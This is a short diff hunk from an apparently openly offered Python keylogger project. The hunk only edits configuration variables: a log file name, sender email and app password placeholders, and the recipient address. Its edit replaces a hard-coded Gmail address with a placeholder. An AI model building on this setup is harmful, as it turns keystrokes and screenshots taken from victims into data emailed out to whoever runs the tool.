@@ -23,7 +23,7 @@ from PIL import ImageGrab
 keys_information = "key_log.txt"
 email_address = "Your email address HERE"
 password = "APP PASSWORD " 
-toaddr = "tmptemp2024@gmail.com"
+toaddr = "Target email address"
 file_path = "D:\\vscode\\python\\advanced_keylogger"  # File path
 extend = "\\"
 ##system info
